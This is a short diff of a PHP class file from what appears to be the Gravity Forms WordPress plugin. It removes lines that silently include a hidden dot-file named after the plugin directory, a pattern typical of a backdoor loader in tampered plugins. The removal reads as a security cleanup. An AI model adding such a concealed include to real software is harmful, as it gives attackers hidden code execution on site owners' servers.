@@ -6,10 +6,6 @@ if ( ! class_exists( 'GFForms' ) ) {
 
 require_once( 'class-gf-locking.php' );
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class GFFormLocking extends GFLocking {
 	public function __construct() {
 		$capabilities = array( 'gravityforms_edit_forms' );
